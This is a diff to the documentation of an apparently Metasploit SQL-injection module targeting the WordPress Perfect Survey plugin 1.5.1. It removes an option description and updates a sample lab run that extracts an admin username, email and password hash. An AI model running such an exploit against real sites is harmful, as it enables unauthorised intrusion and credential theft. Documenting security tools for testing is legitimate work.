@@ -21,10 +21,6 @@ The specific vulnerable version can be found here: https://www.exploit-db.com/ap
 
 ## Options
 
-### SHOW_FULL_RESPONSE
-If set to `true`, the module will print the entire JSON response received from the server when username and password hash extraction fails.
-Default is `false`.
-
 ## Scenarios
 
 ### WordPress with Perfect Survey Plugin 1.5.1 on Ubuntu 20.04
@@ -43,9 +39,16 @@ TARGETURI => /wordpress
 msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > exploit 
 [*] Running module against 192.168.1.104
 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
 [*] Exploiting SQLi in Perfect Survey plugin...
-[+] Received a response from the server!
-[+] Extracted Username: aaryan
-[+] Extracted Password Hash: $P$BroxbUQTM0N32U7JeMmkXPJrxN9ErZ1
-[*] Auxiliary module execution completed
+[*] Extracting credential information
+
+WordPress User Credentials
+==========================
+
+ Username  Email                Hash
+ --------  -----                ----
+ admin     admin@localhost.com  $P$BwkQxR6HIt64UjYRG4D5GRKYdk.qcR1
+msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) >
 ```
